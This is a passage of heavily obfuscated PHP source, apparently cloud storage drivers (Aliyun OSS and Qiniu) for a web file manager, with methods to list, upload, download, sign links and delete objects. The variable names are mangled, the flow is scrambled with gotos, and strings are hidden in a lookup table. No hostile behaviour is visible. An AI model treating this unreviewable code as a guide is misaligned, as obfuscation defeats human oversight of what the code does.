listUploadParts($cÅå­Æºİ¬, $dù’êÈ‹„) { goto bßîƒ½‹Èö; FÜÑ¿êœº: return array($aŠæ‚«Èó×[220] => $cÂÎË˜ÂÉœ, $aŠæ‚«Èó×[210] => $dù’êÈ‹„[$aŠæ‚«Èó×[210]], $aŠæ‚«Èó×[222] => $C Ã ò›á•); goto C„‘Â…Ì¬÷; Bš«×å ñŒ: unset($dù’êÈ‹„[$aŠæ‚«Èó×[211]], $dù’êÈ‹„[$aŠæ‚«Èó×[215]]); $cÂÎË˜ÂÉœ = $this->multiUploadAuthData($cÅå­Æºİ¬, $dù’êÈ‹„); if (empty($cÂÎË˜ÂÉœ)) { return !1; } goto FÜÑ¿êœº; bßîƒ½‹Èö: $aŠæ‚«Èó× =& $_SERVER[Æ]; $Cİ›†À¿í‘ = parse_url_query($dù’êÈ‹„[$aŠæ‚«Èó×[160]]); $bÕÚ‡ÉÎ„Š = $this->client->listParts($this->bucket, $this->pathEncode($cÅå­Æºİ¬), $Cİ›†À¿í‘[$aŠæ‚«Èó×[209]]); goto B©˜”¿¶ôí; B©˜”¿¶ôí: $c°ƒ¿×¾ÂÈ = $bÕÚ‡ÉÎ„Š->getListPart(); $C Ã ò›á• = array(); foreach ($c°ƒ¿×¾ÂÈ as $cïÛöôÔÈÚ) { $C Ã ò›á•[] = array($aŠæ‚«Èó×[1187] => $cïÛöôÔÈÚ->getPartNumber(), $aŠæ‚«Èó×[1188] => trim($cïÛöôÔÈÚ->getETag(), $aŠæ‚«Èó×[113])); } goto Bš«×å ñŒ; C„‘Â…Ì¬÷: } public function download($e›ÛíßÛÇ±, $Cë ŒğŠ°À) { if ($this->isFolder($e›ÛíßÛÇ±)) { return !1; } try { $AÚøğß®Ìƒ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Cë ŒğŠ°À); $AÚøğß®Ìƒ = $this->trafficLimit($_SERVER[Æ][105], $AÚøğß®Ìƒ); $this->client->getObject($this->bucket, $this->pathEncode($e›ÛíßÛÇ±), $AÚøğß®Ìƒ); } catch (OSS\Core\OssException $Fğİá¶‚å») { return !1; } return $Cë ŒğŠ°À; } public function fileSubstr($EÉš™åŞœÔ, $AñÖßàˆ¹„ = 0, $A©Š†Ï÷½„ = false) { if ($AñÖßàˆ¹„ === -1) { $C°Õ¦Ä­³Í = array(); } else { if ($A©Š†Ï÷½„ === !1) { $DñŸ§‡à´É = $this->size($EÉš™åŞœÔ); } else { $DñŸ§‡à´É = $AñÖßàˆ¹„ + $A©Š†Ï÷½„ - 1; } $C°Õ¦Ä­³Í = array(OSS\OssClient::OSS_RANGE => "{$AñÖßàˆ¹„}\x2d{$DñŸ§‡à´É}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($EÉš™åŞœÔ), $C°Õ¦Ä­³Í); } catch (OSS\Core\OssException $aå¬Ó§æµÕ) { think_exception($aå¬Ó§æµÕ->getMessage()); return !1; } } private function trafficLimit($f¼êçî®·¿, $BÏ¡¢Ó¶İ” = array()) { goto A‚¶œ£Õ¿µ; A‚¶œ£Õ¿µ: $cÆĞ¬›ŸÍ =& $_SERVER[Æ]; if ($f¼êçî®·¿ == $cÆĞ¬›ŸÍ[1196] && $this->isUploadServer() || $f¼êçî®·¿ == $cÆĞ¬›ŸÍ[105] && $this->isFileOutServer()) { return $BÏ¡¢Ó¶İ”; } $E˜˜¿…–³ = floatval($GLOBALS[$cÆĞ¬›ŸÍ[6]][$cÆĞ¬›ŸÍ[84]][$cÆĞ¬›ŸÍ[103]][$f¼êçî®·¿]) * 1024 * 1024 * 8; goto F¸ÖáŠªÏ´; F¸ÖáŠªÏ´: if (!$E˜˜¿…–³) { return $BÏ¡¢Ó¶İ”; } $E˜˜¿…–³ = $E˜˜¿…–³ < 819200 ? 819200 : ($E˜˜¿…–³ > 838860800 ? 838860800 : $E˜˜¿…–³); $BÏ¡¢Ó¶İ”[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($E˜˜¿…–³); goto FÛ—ŞƒõÕÕ; FÛ—ŞƒõÕÕ: return $BÏ¡¢Ó¶İ”; goto B½§ºˆÊˆ; B½§ºˆÊˆ: } public function link($E¾‹Ù¹ëĞƒ, $cÑŞƒ†åÏÈ = array()) { $C ÄÙ¡±æÅ =& $_SERVER[Æ]; if (!$this->exist($E¾‹Ù¹ëĞƒ) || $this->isFolder($E¾‹Ù¹ëĞƒ)) { return !1; } try { $cÑŞƒ†åÏÈ = $this->trafficLimit($C ÄÙ¡±æÅ[105], $cÑŞƒ†åÏÈ); $cŠ…ö§´·ó = $this->client->signUrl($this->bucket, $this->pathEncode($E¾‹Ù¹ëĞƒ), 3600 * 12, $C ÄÙ¡±æÅ[216], $cÑŞƒ†åÏÈ); return $this->getCdnLink($cŠ…ö§´·ó); } catch (OSS\Core\OssException $Cïä—³ĞßÏ) { return !1; } } public function fileOut($Bõš¨•¨Ó , $B÷ƒí¹ñ = false, $C¼ë¶ÁÄëš = false, $fÑÆÛ†èÄ = '') { goto CÁ££¤«±‚; CÁ££¤«±‚: $AÏ®ÖÄ‚¸ =& $_SERVER[Æ]; if (!$C¼ë¶ÁÄëš) { $C¼ë¶ÁÄëš = $this->pathThis($Bõš¨•¨Ó ); } $C¼ë¶ÁÄëš = rawurlencode($C¼ë¶ÁÄëš); goto dÙŸÕ—í‡”; fÀª¢Åƒ‡: $A—…óÁ±“Ò = array(OSS\OssClient::OSS_SUB_RESOURCE => $AÏ®ÖÄ‚¸[1208] . rawurlencode("{$B÷ƒí¹ñ}\73\x66\x69\154\x65\x6e\141\x6d\x65\75{$C¼ë¶ÁÄëš}")); $A—…óÁ±“Ò[OSS\OssClient::OSS_SUB_RESOURCE] .= $AÏ®ÖÄ‚¸[1209] . rawurlencode($DÖ®ŠèÇí¸); $AĞÍ§¢ÃÓ = $this->link($Bõš¨•¨Ó , $A—…óÁ±“Ò); goto F‘Ïğå‡¿; F‘Ïğå‡¿: $this->fileOutLink($AĞÍ§¢ÃÓ); goto E’¶å¿““‡; dÙŸÕ—í‡”: $DÖ®ŠèÇí¸ = get_file_mime(get_path_ext($C¼ë¶ÁÄëš)); if ($DÖ®ŠèÇí¸ == $AÏ®ÖÄ‚¸[201]) { return parent::fileOut($Bõš¨•¨Ó , $B÷ƒí¹ñ, $C¼ë¶ÁÄëš, $fÑÆÛ†èÄ); } $B÷ƒí¹ñ = $B÷ƒí¹ñ ? $AÏ®ÖÄ‚¸[202] : $AÏ®ÖÄ‚¸[203]; goto fÀª¢Åƒ‡; E’¶å¿““‡: } public function fileOutServer($B±ôÒõ¯Õè, $CœæŞÛÕæÃ = false, $e•”Êº¹Œ = false, $D¦”Ôê©å· = '') { parent::fileOut($B±ôÒõ¯Õè, $CœæŞÛÕæÃ, $e•”Êº¹Œ, $D¦”Ôê©å·); } public function fileOutImage($a¬¨Ô¹îåÚ, $C²ëÕùÄ¾Á = 250) { $fÄğóáëˆ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Æ][1210] . $C²ëÕùÄ¾Á); $e®ºØ†£ä÷ = $this->link($a¬¨Ô¹îåÚ, $fÄğóáëˆ); $this->fileOutLink($e®ºØ†£ä÷); } public function fileOutImageServer($c‘¢æÖé²Ä, $AšÓË¾±ó = 250) { parent::fileOutImage($c‘¢æÖé²Ä, $AšÓË¾±ó); } public function fileOutLink($FÁ‰¤˜Ñ…Â) { $bµ¢øã¬„  =& $_SERVER[Æ]; if (!$this->isCdnHost() && substr($FÁ‰¤˜Ñ…Â, 0, 7) == $bµ¢øã¬„ [1115]) { $FÁ‰¤˜Ñ…Â = $bµ¢øã¬„ [1116] . substr($FÁ‰¤˜Ñ…Â, 7); } header($bµ¢øã¬„ [156] . $FÁ‰¤˜Ñ…Â); die; } public function hashMd5($CÑÎ±ôî´, $B©¶¥šòÒ = '') { $F—æŸ Ş÷ê =& $_SERVER[Æ]; $dÁï±½¨ïø = $this->objectMeta($CÑÎ±ôî´); if (!$dÁï±½¨ïø) { return $F—æŸ Ş÷ê[33]; } if (!isset($dÁï±½¨ïø[$F—æŸ Ş÷ê[1183]]) && !empty($B©¶¥šòÒ)) { $fÎå«¤—Çœ = $this->updateObjMeta($CÑÎ±ôî´, array($F—æŸ Ş÷ê[1183] => $B©¶¥šòÒ)); $dÁï±½¨ïø[$F—æŸ Ş÷ê[1183]] = $fÎå«¤—Çœ ? $B©¶¥šòÒ : $F—æŸ Ş÷ê[33]; } return isset($dÁï±½¨ïø[$F—æŸ Ş÷ê[1183]]) ? strtolower($dÁï±½¨ïø[$F—æŸ Ş÷ê[1183]]) : $F—æŸ Ş÷ê[33]; } public function size($Cí³Âœ¤®) { $E­š·½ÁÈ = $this->objectMeta($Cí³Âœ¤®); return $E­š·½ÁÈ ? $E­š·½ÁÈ[$_SERVER[Æ][77]] : 0; } public function info($eãé›ß­×÷) { if ($this->isFolder($eãé›ß­×÷)) { return $this->folderInfo($eãé›ß­×÷); } else { if ($this->isFile($eãé›ß­×÷)) { return $this->fileInfo($eãé›ß­×÷); } } return !1; } public function exist($EªìİÙÜˆá) { return $this->isFile($EªìİÙÜˆá) || $this->isFolder($EªìİÙÜˆá); } public function isFile($F†¸œ¨‹¦) { return !$this->isFolder($F†¸œ¨‹¦) && $this->objectMeta($F†¸œ¨‹¦); } public function isFolder($f÷›ÁÄ×Œ¿) { return $this->cacheMethod($_SERVER[Æ][223], $f÷›ÁÄ×Œ¿); } protected function objectMeta($CÇŠ¢º§Îš) { return $this->cacheMethod($_SERVER[Æ][224], $CÇŠ¢º§Îš); } protected function _objectMeta($c­ñßŠÑÓ) { $a²ˆÍ»áŒà =& $_SERVER[Æ]; try { $Då÷¾§İÁ¸ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($c­ñßŠÑÓ)); } catch (OSS\Core\OssException $A‡‘ªö¥ó») { $Då÷¾§İÁ¸ = !1; } if ($Då÷¾§İÁ¸) { $Då÷¾§İÁ¸[$a²ˆÍ»áŒà[77]] = intval($Då÷¾§İÁ¸[$a²ˆÍ»áŒà[1190]]); } return $Då÷¾§İÁ¸; } protected function _isFolder($D›’•ÍÑ) { $Cˆ—‰ø†ÙÚ =& $_SERVER[Æ]; if ($D›’•ÍÑ == $Cˆ—‰ø†ÙÚ[33] || $D›’•ÍÑ == $Cˆ—‰ø†ÙÚ[8]) { return !0; } $EÌæ’ÃŸ³º = array($Cˆ—‰ø†ÙÚ[1180] => $Cˆ—‰ø†ÙÚ[8], $Cˆ—‰ø†ÙÚ[186] => rtrim($D›’•ÍÑ, $Cˆ—‰ø†ÙÚ[8]) . $Cˆ—‰ø†ÙÚ[8], $Cˆ—‰ø†ÙÚ[1181] => 1, $Cˆ—‰ø†ÙÚ[1182] => $Cˆ—‰ø†ÙÚ[33]); $aøŠå×î‡‡ = $this->client->listObjects($this->bucket, $EÌæ’ÃŸ³º); if ($aøŠå×î‡‡->getObjectList() || $aøŠå×î‡‡->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($A‡ìÇ²õÙ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Æ][1211]; $this->_init($A‡ìÇ²õÙ); } public function _init($Eƒ²«©±Ğí) { foreach ($Eƒ²«©±Ğí as $E®Îó¹–¤ => $Fõ£õŸ×Íæ) { if (isset($this->{$E®Îó¹–¤})) { $this->{$E®Îó¹–¤} = $Fõ£õŸ×Íæ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Æ][1212], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($E”Ë¦¦ÀÅ, $E¦‹Œ‰ˆÊŒ = '', $A‹”ƒ´‘ó = REPEAT_RENAME) { if ($this->setContent($E”Ë¦¦ÀÅ, $E¦‹Œ‰ˆÊŒ)) { return $this->getPathOuter($E”Ë¦¦ÀÅ); } return !1; } public function mkdir($E¾ã˜Ñ•ŠÙ, $câ™Âïš¿‡ = REPEAT_SKIP) { goto Fõùñ¶›ë; D´½Ã ä’”: if (!$this->mkfile($d—İÇ±“×ñ)) { return !1; } if (!$this->moveFile($d—İÇ±“×ñ, $E¾ã˜Ñ•ŠÙ)) { $this->delFile($d—İÇ±“×ñ); return !1; } return $this->getPathOuter($c¦²Äö”‡Å); goto BÜºÂ±Ğ; Fõùñ¶›ë: $A˜Êâ¸¥ =& $_SERVER[Æ]; $c¦²Äö”‡Å = trim($E¾ã˜Ñ•ŠÙ, $A˜Êâ¸¥[8]); if ($this->_isFolder($c¦²Äö”‡Å)) { return $this->getPathOuter($c¦²Äö”‡Å); } goto B¨Ï«ñø¹´; B¨Ï«ñø¹´: $E¾ã˜Ñ•ŠÙ = $c¦²Äö”‡Å . $A˜Êâ¸¥[8]; $aÓªÇ…©ôî = get_path_this($c¦²Äö”‡Å); $d—İÇ±“×ñ = $E¾ã˜Ñ•ŠÙ . $aÓªÇ…©ôî; goto D´½Ã ä’”; BÜºÂ±Ğ: } public function copyFile($F“Ö¹³ïØé, $E¢£¡º§­) { $F÷ØÚëÛ•œ = $this->bucketManager->copy($this->bucket, $F“Ö¹³ïØé, $this->bucket, $E¢£¡º§­, !0); return $F÷ØÚëÛ•œ ? !1 : !0; } public function moveFile($Déä°Ïˆ®, $aÃğƒÏš›) { $A¢Ÿ °›¡¤ = $this->bucketManager->move($this->bucket, $Déä°Ïˆ®, $this->bucket, $aÃğƒÏš›, !0); return $A¢Ÿ °›¡¤ ? !1 : !0; } public function delFile($c¯®’¤‡‰ç) { $BÜÇ¢—ï¾ = $this->bucketManager->delete($this->bucket, $c¯®’¤‡‰ç); return $BÜÇ¢—ï¾ ? !1 : !0; } public function delFolder($B‡£áŒÜ¼É) { $f´À¥Š‰·‡ = $this->fileList($B‡£áŒÜ¼É); if (empty($f´À¥Š‰·‡)) { return !0; } $bâ¾„ÚèÀ† = 1000; if (count($f´À¥Š‰·‡) <= $bâ¾„ÚèÀ†) { return $this->qnDelObj($f´À¥Š‰·‡) ? !1 : !0; } foreach (array_chunk($f´À¥Š‰·‡, $bâ¾„ÚèÀ†) as $Eáˆ‚ØõØ) { $Fª»¡Ï‰§¼ = $this->qnDelObj($Eáˆ‚ØõØ); if ($Fª»¡Ï‰§¼) { return !1; } } return !0; } private function qnDelObj($B¢„ °Ì—) { $A«é”æÆâÄ = $this->bucketManager->buildBatchDelete($this->bucket, $B¢„ °Ì—); list($C²Ï˜ÏÄ¨, $d‰èØÄ¢œ) = $this->bucketManager->batch($A«é”æÆâÄ); return $d‰èØÄ¢œ; } private function fileList($eÇÃ¬Äã‘Ä, $f…ÄÑ‚‘óã = 0) { goto eÒ„¶ø‰–ê; fñ©Ë„é’: $E¯¾¢Ëè”Ó = array(); while (!0) { list($AË „‡çï, $cô¡ˆòÈÆ²) = $this->bucketManager->listFiles($this->bucket, $EœôèÜƒ°ï, $aÀíŠÕ…À, $Aœ¢± ”À’, $A›¢ÀŒ²‘×); if ($cô¡ˆòÈÆ²) { return !1; } $aÀíŠÕ…À = array_key_exists($F‡îè‘ŠÖâ[1182], $AË „‡çï) ? $aÀíŠÕ…À = $AË „‡çï[$F‡îè‘ŠÖâ[1213]] : $F‡îè‘ŠÖâ[33]; foreach ($AË „‡çï[$F‡îè‘ŠÖâ[1214]] as $e‡Ÿš ˆÍ) { $aá†ù¯Ôé = $e‡Ÿš ˆÍ[$F‡îè‘ŠÖâ[89]]; if ($f…ÄÑ‚‘óã) { $aá†ù¯Ôé = array($F‡îè‘ŠÖâ[28] => $aá†ù¯Ôé, $F‡îè‘ŠÖâ[77] => $e‡Ÿš ˆÍ[$F‡îè‘ŠÖâ[1215]]); } $E¯¾¢Ëè”Ó[] = $aá†ù¯Ôé; } if ($aÀíŠÕ…À == $F‡îè‘ŠÖâ[33]) { break; } } return $E¯¾¢Ëè”Ó; goto f¸æ‘İ×£; a¥ÁÔñÚô‰: $aÀíŠÕ…À = $F‡îè‘ŠÖâ[33]; $Aœ¢± ”À’ = 1000; $A›¢ÀŒ²‘× = $F‡îè‘ŠÖâ[33]; goto fñ©Ë„é’; eÒ„¶ø‰–ê: $F‡îè‘ŠÖâ =& $_SERVER[Æ]; $eÇÃ¬Äã‘Ä = trim($eÇÃ¬Äã‘Ä, $F‡îè‘ŠÖâ[8]); $EœôèÜƒ°ï = empty($eÇÃ¬Äã‘Ä) ? $F‡îè‘ŠÖâ[33] : $eÇÃ¬Äã‘Ä . $F‡îè‘ŠÖâ[8]; goto a¥ÁÔñÚô‰; f¸æ‘İ×£: } public function rename($d“²Ã¹Ä‘Ø, $E¼Ú–ŠØ…ï) { return $this->renameObject($d“²Ã¹Ä‘Ø, $E¼Ú–ŠØ…ï); } public function fileInfo($C’‡†—Å™ì, $aØ’©‰˜³¢ = false, $dÔ¸•Œª = array()) { goto dÚƒËğÚß­; F³£¹Ç‡”: return $bÏ§‹©Ó¾; goto A½å‚İ‰«; f’¤İ°Ê×‘: if (empty($dÔ¸•Œª)) { $dÔ¸•Œª = $this->objectMeta($C’‡†—Å™ì); if (!$dÔ¸•Œª) { return $bÏ§‹©Ó¾; } } if (isset($dÔ¸•Œª[$F¹‡“ô†³¥[1216]])) { $bÏ§‹©Ó¾[$F¹‡“ô†³¥[187]] = $dÔ¸•Œª[$F¹‡“ô†³¥[1216]]; } if (isset($dÔ¸•Œª[$F¹‡“ô†³¥[1215]])) { $bÏ§‹©Ó¾[$F¹‡“ô†³¥[77]] = $dÔ¸•Œª[$F¹‡“ô†³¥[1215]]; } goto F³£¹Ç‡”; dÚƒËğÚß­: $F¹‡“ô†³¥ =& $_SERVER[Æ]; if ($aØ’©‰˜³¢) { return array($F¹‡“ô†³¥[28] => $this->pathThis($C’‡†—Å™ì), $F¹‡“ô†³¥[75] => $this->getPathOuter($F¹‡“ô†³¥[8] . $C’‡†—Å™ì), $F¹‡“ô†³¥[29] => $F¹‡“ô†³¥[167], $F¹‡“ô†³¥[77] => isset($dÔ¸•Œª[$F¹‡“ô†³¥[1215]]) ? $dÔ¸•Œª[$F¹‡“ô†³¥[1215]] : 0, $F¹‡“ô†³¥[160] => $this->ext($C’‡†—Å™ì)); } $bÏ§‹©Ó¾ = array($F¹‡“ô†³¥[28] => $this->pathThis($C’‡†—Å™ì), $F¹‡“ô†³¥[75] => $this->getPathOuter($F¹‡“ô†³¥[8] . $C’‡†—Å™ì), $F¹‡“ô†³¥[29] => $F¹‡“ô†³¥[167], $F¹‡“ô†³¥[187] => 0, $F¹‡“ô†³¥[107] => 0, $F¹‡“ô†³¥[77] => 0, $F¹‡“ô†³¥[160] => $this->ext($C’‡†—Å™ì), $F¹‡“ô†³¥[188] => !0, $F¹‡“ô†³¥[189] => !0); goto f’¤İ°Ê×‘; A½å‚İ‰«: } public function folderInfo($bºÃ„ÂÜ»Ã, $Bæ¢¤ˆ¼äÌ = false) { goto bÑãá¯ÓÔ; bÑãá¯ÓÔ: $B¬«©²Š®˜ =& $_SERVER[Æ]; if ($Bæ¢¤ˆ¼äÌ) { return array($B¬«©²Š®˜[28] => $this->pathThis($bºÃ„ÂÜ»Ã), $B¬«©²Š®˜[75] => $this->getPathOuter($B¬«©²Š®˜[8] . $bºÃ„ÂÜ»Ã), $B¬«©²Š®˜[29] => $B¬«©²Š®˜[76]); } $b“¥¯ó®©‡ = array($B¬«©²Š®˜[28] => $this->pathThis($bºÃ„ÂÜ»Ã), $B¬«©²Š®˜[75] => $this->getPathOuter($B¬«©²Š®˜[8] . $bºÃ„ÂÜ»Ã), $B¬«©²Š®˜[29] => $B¬«©²Š®˜[76], $B¬«©²Š®˜[187] => 0, $B¬«©²Š®˜[107] => 0, $B¬«©²Š®˜[1161] => !0, $B¬«©²Š®˜[1162] => !0); goto cˆ˜ëœ®Î®; bã¡Ñ·ÏÓ: return $b“¥¯ó®©‡; goto AÜ™Ü’Ó·; cˆ˜ëœ®Î®: $bºÃ„ÂÜ»Ã = rtrim($bºÃ„ÂÜ»Ã, $B¬«©²Š®˜[8]) . $B¬«©²Š®˜[8]; $ağµ¢ñ“İâ = $this->objectMeta($bºÃ„ÂÜ»Ã); if (isset($ağµ¢ñ“İâ[$B¬«©²Š®˜[1216]])) { $b“¥¯ó®©‡[$B¬«©²Š®˜[187]] = $ağµ¢ñ“İâ[$B¬«©²Š®˜[1216]]; } goto bã¡Ñ·ÏÓ; AÜ™Ü’Ó·: } public function listPath($dñ°É»£¾Ç, $bé«ÒÑâ„Ç = false) { goto f‘½º‡ÒÎñ; FõƒÇ±Şš: $e³³ÅŸÕÕ = $AŒƒ½©ùÃˆ = array(); while (!0) { list($b°·×‰­†î, $B³ÍÎï‘©) = $this->bucketManager->listFiles($this->bucket, $A˜ °…ç, $a¹„…ŒÄ†, $C“ÏîÂÅß, $FØ´ÅŠÆÖï); if ($B³ÍÎï‘©) { return !1; } $a¹„…ŒÄ† = array_key_exists($f…—ÑÊ®÷Ã[1182], $b°·×‰­†î) ? $a¹„…ŒÄ† = $b°·×‰­†î[$f…—ÑÊ®÷Ã[1213]] : $f…—ÑÊ®÷Ã[33]; if (isset($b°·×‰­†î[$f…—ÑÊ®÷Ã[1217]])) { foreach ($b°·×‰­†î[$f…—ÑÊ®÷Ã[1217]] as $e¾º‚„§²ì) { if ($e¾º‚„§²ì == $A˜ °…ç) { continue; } $e³³ÅŸÕÕ[] = $this->folderInfo($e¾º‚„§²ì, $bé«ÒÑâ„Ç); } } if (isset($b°·×‰­†î[$f…—ÑÊ®÷Ã[1214]])) { foreach ($b°·×‰­†î[$f…—ÑÊ®÷Ã[1214]] as $BŒéò©™Ö£) { if ($BŒéò©™Ö£[$f…—ÑÊ®÷Ã[89]] == $A˜ °…ç) { continue; } $AŒƒ½©ùÃˆ[] = $this->fileInfo($BŒéò©™Ö£[$f…—ÑÊ®÷Ã[89]], $bé«ÒÑâ„Ç, $BŒéò©™Ö£); } } if ($a¹„…ŒÄ† == $f…—ÑÊ®÷Ã[33]) { break; } } return array($f…—ÑÊ®÷Ã[74] => $e³³ÅŸÕÕ, $f…—ÑÊ®÷Ã[73] => $AŒƒ½©ùÃˆ); goto cÉØĞàÖø; a×Éñßº: $a¹„…ŒÄ† = $f…—ÑÊ®÷Ã[33]; $C“ÏîÂÅß = 1000; $FØ´ÅŠÆÖï = $f…—ÑÊ®÷Ã[8]; goto FõƒÇ±Şš; f‘½º‡ÒÎñ: $f…—ÑÊ®÷Ã =& $_SERVER[Æ]; $dñ°É»£¾Ç = trim($dñ°É»£¾Ç, $f…—ÑÊ®÷Ã[8]); $A˜ °…ç = empty($dñ°É»£¾Ç) ? $f…—ÑÊ®÷Ã[33] : $dñ°É»£¾Ç . $f…—ÑÊ®÷Ã[8]; goto a×Éñßº; cÉØĞàÖø: } public function has($e—ãç”‘å, $Fˆ‡ºˆ÷† = false, $FŠƒÈŸ¤ = true) { goto CÄÒ±…¨“; BªŞÏÙ‚·…: if ($Fˆ‡ºˆ÷†) { return array($CÆ¶‹ÙŒº[191] => $A”ò˜æ¤Ô, $CÆ¶‹ÙŒº[192] => $dêùæ‚¶ƒ); } return !1; goto D¿Âª‘Ï´¼; bÄ†Ë¡Š‘: $A”ò˜æ¤Ô = 0; $dêùæ‚¶ƒ = 0; while (!0) { list($E›¨ßÎ»Å, $d¡šêÚî‚×) = $this->bucketManager->listFiles($this->bucket, $EôÕåÇ´ÔÉ, $e™Á¦¯©», $Fè‰Ì¦ßÂ•, $aŸ–» ÅÎë); if ($d¡šêÚî‚×) { return !1; } $e™Á¦¯©» = array_key_exists($CÆ¶‹ÙŒº[1182], $E›¨ßÎ»Å) ? $e™Á¦¯©» = $E›¨ßÎ»Å[$CÆ¶‹ÙŒº[1213]] : $CÆ¶‹ÙŒº[33]; if ($Fˆ‡ºˆ÷†) { if (!empty($E›¨ßÎ»Å[$CÆ¶‹ÙŒº[1214]])) { $A”ò˜æ¤Ô += count($E›¨ßÎ»Å[$CÆ¶‹ÙŒº[1214]]); } if (!empty($E›¨ßÎ»Å[$CÆ¶‹ÙŒº[1217]])) { $dêùæ‚¶ƒ += count($E›¨ßÎ»Å[$CÆ¶‹ÙŒº[1217]]); } if ($e™Á¦¯©» === $CÆ¶‹ÙŒº[33]) { break; } continue; } if ($FŠƒÈŸ¤) { if (!empty($E›¨ßÎ»Å[$CÆ¶‹ÙŒº[1214]])) { return !0; } } else { if (!empty($E›¨ßÎ»Å[$CÆ¶‹ÙŒº[1217]])) { return !0; } } if ($e™Á¦¯©» == $CÆ¶‹ÙŒº[33]) { break; } } goto BªŞÏÙ‚·…; CÄÒ±…¨“: $CÆ¶‹ÙŒº =& $_SERVER[Æ]; $e—ãç”‘å = trim($e—ãç”‘å, $CÆ¶‹ÙŒº[8]); $EôÕåÇ´ÔÉ = empty($e—ãç”‘å) ? $CÆ¶‹ÙŒº[33] : $e—ãç”‘å . $CÆ¶‹ÙŒº[8]; goto A¬¤óóçë‹; A¬¤óóçë‹: $e™Á¦¯©» = $CÆ¶‹ÙŒº[33]; $Fè‰Ì¦ßÂ• = 1000; $aŸ–» ÅÎë = $CÆ¶‹ÙŒº[8]; goto bÄ†Ë¡Š‘; D¿Âª‘Ï´¼: } public function listAll($CŒÊòãº¬¿) { $Bö„™½ñ× =& $_SERVER[Æ]; $a¢â‹†ˆ±Î = $this->fileList($CŒÊòãº¬¿, 1); $dëİøŞƒºÉ = array(); foreach ($a¢â‹†ˆ±Î as $c±¾™¡æé‘) { $dëİøŞƒºÉ[$c±¾™¡æé‘[$Bö„™½ñ×[28]]] = $c±¾™¡æé‘[$Bö„™½ñ×[77]]; } return $this->listAllFiles($CŒÊòãº¬¿, array_keys($dëİøŞƒºÉ), $dëİøŞƒºÉ); } public function canRead($eÚğÎÖ¾Ôä) { return $this->exist($eÚğÎÖ¾Ôä) ? !0 : !1; } public function canWrite($dºŒ—±ÅÆ¯) { return $this->exist($dºŒ—±ÅÆ¯) ? !0 : !1; } public function getContent($F´åÖøÔŠ) { return $this->fileSubstr($F´åÖøÔŠ, 0, -1); } public function setContent($B…à†ØˆÁÒ, $a½¡œˆÖˆ = '') { $AÎÅ¨íÖÑ½ = $this->tempFile($this->pathThis($B…à†ØˆÁÒ)); file_put_contents($AÎÅ¨íÖÑ½, $a½¡œˆÖˆ); if ($this->upload($B…à†ØˆÁÒ, $AÎÅ¨íÖÑ½)) { $this->tempFileRemve($AÎÅ¨íÖÑ½); return !0; } return !1; } public function refreshUrls($E”ƒ•øÑÊ) { goto B‘íŒ•‹Ş; b«¡äâôêÉ: $EòŞÏ‘‰¦‡ = new Qiniu\Cdn\CdnManager($this->auth); list($aÓ…‚ä¾, $b¹Ò‘Ó´Îç) = $EòŞÏ‘‰¦‡->refreshUrls($cÔÌòëä¶£); if ($b¹Ò‘Ó´Îç) { return !1; } goto FŸö¶ÅøÕ; B‘íŒ•‹Ş: $Aê§äÛæÙæ =& $_SERVER[Æ]; $cÔÌòëä¶£ = array(); if (is_array($E”ƒ•øÑÊ)) { foreach ($E”ƒ•øÑÊ as $BŞ·ÜÃ¦ó©) { $cÔÌòëä¶£[] = $this->link($BŞ·ÜÃ¦ó©); } } else { $cÔÌòëä¶£[] = $this->link($E”ƒ•øÑÊ); } goto b«¡äâôêÉ; FŸö¶ÅøÕ: return $aÓ…‚ä¾[$Aê§äÛæÙæ[1218]] == $Aê§äÛæÙæ[694] ? !0 : !1; goto f…î©áƒÛ; f…î©áƒÛ: } public function fileSubstr($eåÑ¸ÜÕ¨Ã, $Dì²øªŸ, $dÑÚÂË§¶) { $fÂ™ì¼‘¤à =& $_SERVER[Æ]; if (!($C¬‹•áì·Ì = $this->link($eåÑ¸ÜÕ¨Ã))) { return !1; } $Aè®ŒÌ¯ó = !1; if ($dÑÚÂË§¶ > 0) { $dæ„õ‡×šÔ = $Dì²øªŸ + $dÑÚÂË§¶ - 1; $Aè®ŒÌ¯ó = array($fÂ™ì¼‘¤à[1219] . $Dì²øªŸ . $fÂ™ì¼‘¤à[412] . $dæ„õ‡×šÔ); } $cÖÃšŠÉ—Š = url_request($C¬‹•áì·Ì, $fÂ™ì¼‘¤à[216], !1, $Aè®ŒÌ¯ó); return $cÖÃšŠÉ—Š[$fÂ™ì¼‘¤à[687]] ? $cÖÃšŠÉ—Š[$fÂ™ì¼‘¤à[1034]] : !1; } public function upload($dãƒóğæ‘, $f³¸¯‹‚îô, $c±‘·¦Û‰Â = false, $d‰±…óÖ¬ù = REPEAT_REPLACE) { $DÈ­†«‡ŠÄ = new Qiniu\Storage\UploadManager(); $BŒ©Ø†·ã— = $this->auth->uploadToken($this->bucket, $dãƒóğæ‘); $DëÇµÕ†¬ = get_file_mime(get_path_ext($f³¸¯‹‚îô)); list($F¬«Œ…æÄ, $A©¨ÄäÎØŒ) = $DÈ­†«‡ŠÄ->putFile($BŒ©Ø†·ã—, $dãƒóğæ‘, $f³¸¯‹‚îô, null, $DëÇµÕ†¬); return $A©¨ÄäÎØŒ ? !1 : $this->getPathOuter($dãƒóğæ‘); } public function uploadFormData($aºöˆŞœ, $dê«ƒïÊÀ = 3600) { return $this->uploadToken($aºöˆŞœ, $dê«ƒïÊÀ); } public function multiUploadFormData($Bƒ´ĞµÃ“, $fÇœÖ¦æ‰® = 3600) { return $this->uploadToken($Bƒ´ĞµÃ“, $fÇœÖ¦æ‰®); } 